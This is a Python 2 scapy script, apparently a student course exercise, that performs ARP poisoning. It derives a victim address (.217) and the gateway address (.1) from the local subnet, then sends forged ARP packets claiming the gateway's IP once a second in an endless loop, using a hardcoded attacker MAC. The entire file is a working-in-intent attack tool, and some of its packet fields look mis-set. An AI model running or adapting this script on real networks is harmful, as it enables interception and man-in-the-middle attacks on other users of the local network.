__author__ = 'Yuxibro'

import logging
#import socket
logging.getLogger("scapy").setLevel(1)
from scapy.all import *


#MAIN:
# After reading an article that's posted on course lecture note: http://www.arppoisoning.com/demonstrating-an-arp-poisoning-attack/
IPV4Address = socket.gethostbyname(socket.gethostname())
splittedIPv4 = IPV4Address.split(".")               # get current IPV4 and split it into array
print "Our IPV4 address: ",IPV4Address      #rejoin the string for printing


# takes an splitted IPv4 address array and assemble it back to standard IPv4 address with "."
def reassembleIPAddress(splittedIPArrary):
    resultString = ""
    for index in range(len(splittedIPArrary)):
        if index < len(splittedIPArrary)-1:
            resultString+=splittedIPArrary[index]+"."
        else:
            resultString+=splittedIPArrary[index]
    return resultString


# generate random victim
while 1:
    op = 1
    victim = splittedIPv4
    victim[3] = "217"
    print "victim: ",reassembleIPAddress(victim)
    victim = reassembleIPAddress(victim)
    #gateway IP address
    spoof = splittedIPv4
    spoof[3] = "1"
    print "spoof: ",reassembleIPAddress(spoof)
    spoof = reassembleIPAddress(spoof)
    # Attacker MAC address
    mac = "78:31:c1:d3:ec:dc"
    arp = ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
    arp.show()
    send(arp)
    time.sleep(1)